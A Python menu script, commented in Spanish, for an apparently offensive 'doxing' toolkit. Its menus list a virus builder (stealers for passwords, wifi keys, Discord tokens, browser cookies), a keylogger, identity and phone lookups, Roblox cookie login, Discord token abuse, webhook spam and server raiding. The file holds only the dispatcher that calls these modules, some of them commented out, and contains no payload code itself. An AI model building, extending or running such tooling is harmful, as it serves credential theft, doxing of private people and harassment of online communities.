import shutil
import os
from colorama import init, Fore, Style
# from src.commands.dox.comandos.dni import main
from src.commands.dox.comandos.token.token_login import token_login
from src.commands.dox.comandos.email_track import email_track
# from src.commands.dox.comandos.rat_utilidades.personas_infectada import personas
#from src.commands.dox.comandos.rat_utilidades.stelar_rat.stelar_personas.stelar_personas import stelar
#from src.commands.dox.comandos.token.token_info import token_info
from src.commands.dox.comandos.bot.invite_bot import invite_bot_id
init()


# colores para el arsii
R = Fore.RED  #rojo
W = Fore.WHITE  #blanco
GRAY = Fore.LIGHTBLACK_EX #gris 
G = Fore.GREEN  #verde
P = Fore.MAGENTA #purpura

def doxing():
    
    doxing_letra = f"""
{Fore.RED}  ██████ ▄▄▄█████▓▓█████  ██▓    ▄▄▄       ██▀███ ▓██   ██▓  ██████ 
{Fore.RED}▒██    ▒ ▓  ██▒ ▓▒▓█   ▀ ▓██▒   ▒████▄    ▓██ ▒ ██▒▒██  ██▒▒██    ▒ 
{Fore.RED}░ ▓██▄   ▒ ▓██░ ▒░▒███   ▒██░   ▒██  ▀█▄  ▓██ ░▄█ ▒ ▒██ ██░░ ▓██▄   
{Fore.RED} ▒   ██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██░   ░██▄▄▄▄██ ▒██▀▀█▄   ░ ▐██▓░  ▒   ██▒
{Fore.RED}▒██████▒▒  ▒██▒ ░ ░▒████▒░██████▒▓█   ▓██▒░██▓ ▒██▒ ░ ██▒▓░▒██████▒▒
{Fore.RED}▒ ▒▓▒ ▒ ░  ▒ ░░   ░░ ▒░ ░░ ▒░▓  ░▒▒   ▓▒█░░ ▒▓ ░▒▓░  ██▒▒▒ ▒ ▒▓▒ ▒ ░
{Fore.LIGHTRED_EX}░ ░▒  ░ ░    ░     ░ ░  ░░ ░ ▒  ░ ▒   ▒▒ ░  ░▒ ░ ▒░▓██ ░▒░ ░ ░▒  ░ ░
{Fore.LIGHTRED_EX}░  ░  ░    ░         ░     ░ ░    ░   ▒     ░░   ░ ▒ ▒ ░░  ░  ░  ░  
{Fore.LIGHTRED_EX}     ░              ░  ░    ░  ░     ░  ░   ░     ░ ░           ░  
"""
    centrar_texto(doxing_letra)

def opciones():
    opciones = f"""
{Fore.RED}┌─ [{W}G{R}] 
{Fore.RED}├─ [{W}N{R}]                                                                                            
{Fore.RED}├─ [{W}B{R}]      ┌─────────────────┐                        ┌───────┐                           ┌───────────┐          
{Fore.RED}└─┬─────────┤ {Fore.LIGHTRED_EX}Virus Builder   {Fore.RED}├─────────┬──────────────┤ {Fore.LIGHTRED_EX}Osint {Fore.RED}├──────────────┬────────────┤ {Fore.LIGHTRED_EX}Utilidade {Fore.RED}├──────────────
{Fore.RED}  │         └─────────────────┘         │              └───────┘              │            └───────────┘
{Fore.RED}  └─ [{W}1{R}] {W}Crear virus                    {R}├─ [{W}2{R}] {W}Buscar DNI                     {R}└─ [{W}6{R}] {W}Login Roblox Cokies
{Fore.RED}          ├─ {W}Stealer                    {R}├─ [{W}3{R}] {W}Buscar redes                   
{Fore.RED}          │  ├─ {W}Gestores/wifi           {R}├─ [{W}4{R}] {W}Email track        
{Fore.RED}          │  ├─ {W}Discord Token           {R}└─ [{W}5{R}] {W}Look Phone                   
{Fore.RED}          │  ├─ {W}Navegador stelar
{Fore.RED}          │  └─ {W}Cookie
{Fore.RED}          │  
{Fore.RED}          └─ {W}Malware
{Fore.RED}             ├─  {W}Keylogger
{Fore.RED}             └─  {W}Monitoreo
"""
    print(opciones)

def opciones2():    
    opciones2 = f"""

{Fore.RED} ┌─ [{W}B{R}]                                                ┌─────────┐                                               
{Fore.RED} └─┬───────────────────────────────────────────────────┤ {Fore.LIGHTRED_EX}Discord {Fore.RED}├────────────────────────────────────────────────────
{Fore.RED}   │                                                   └─────────┘                       
{Fore.RED}   ├─ [{W}7{R}] {W}Token-info{R}                                      ┌─ [{W}15{R}] {W}Generar-invite-bot{R}           ┌─ [{W}19{R}] {W}Bot-raid-server
{Fore.RED}   ├─ [{W}8{R}] {W}Token-Join{R}                                      ├─ [{W}16{R}] {W}Webhook-info{R}                 ├─  {W}Bot/raid
{Fore.RED}   ├─ [{W}9{R}] {W}Token-leave{R}                                     ├─ [{W}17{R}] {W}Webhook-delete{R}               │   ├─ {W}Mas-Dms
{Fore.RED}   ├─ [{W}10{R}] {W}Token-login{R}                                    ├─ [{W}18{R}] {W}Webhook-spam{R}                 │   ├─ {W}nuke/server
{Fore.RED}   ├─ [{W}11{R}] {W}token-Spamer{R}                                   ├─ [{W}18{R}] {W}discord-cloner{R}               │   └─ {W} Spam/canal
{Fore.RED}   ├─ [{W}12{R}] {W}Token-eliminar-friends{R}                         │                                    │  
{Fore.RED}   ├─ [{W}13{R}] {W}Token-Bloquear-friends{R}                         │                                    │
{Fore.RED}   ├─ [{W}14{R}] {W}Token-eliminar-dms{R}                             │                                    │
{Fore.RED}   ├─ [{W}14{R}] {W}Token-Info{R}                                     │                                    │
{Fore.RED}   └──────────────────────────────────────────────────────┴────────────────────────────────────┘
"""
    clear_console() # llamar funcion desde def clear_console(): para poder limpiar la consola
    doxing() # llama arsi
    print(opciones2) # llama a las segundas opciones de menu

# centrar texto del arsi
def centrar_texto(texto):
    terminal_ancho = shutil.get_terminal_size().columns
    for linea in texto.split('\n'):
        print(" " * max((terminal_ancho - len(linea)) // 2, 0) + linea) # separa el ancho de la terminal

# Lipiar la consola (llamado solo para doxing menu)
def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')


# barra comandos
def menu_simplify():
    while True:
        opcion = input(Fore.RED +
        "┌───[Menu-2@discord.gg/astralix]─\n"
        "└──$ " + Style.RESET_ALL)
        
        try:
            if opcion in ['dni', '2']:
                break

            elif opcion in ['token login', '10']:   
                token_login()  

            elif opcion in ['email track', '4']:   
                email_track()

           # elif opcion == 'stelar infectados':    
                #personas()

           # elif opcion == 'stelar':    
               # stelar()    

           # elif opcion in ['token info', '7']:    
              #  token_info()    

            elif opcion in ['invite bot', '15']:    
                invite_bot_id()      

            elif opcion == 'n':    
                opciones2()

            elif opcion == 'b':    
                clear_console()
                doxing()
                opciones()
                
            elif opcion == 'clear':
                clear_console()  
                doxing()

            elif opcion == 'help':
                clear_console()
                doxing()
                opciones()

            elif opcion == 'close':
                clear_console()
                break

            elif opcion == 'exit':
                clear_console()
                break    
                

            else:
                input(f"""
{R}[{W}x{R}] {R}| {R}Opcion invalida revise {G}/help
""")
                clear_console()
                doxing()
                opciones()
        except Exception as e:
            print(f"Consultar a pablo")
                


if __name__ == "__main__":
    clear_console() # llamar funcion desde def clear_console(): para poder limpiar la consola
    doxing() # llama arsi
    opciones() # llama a la opcion principal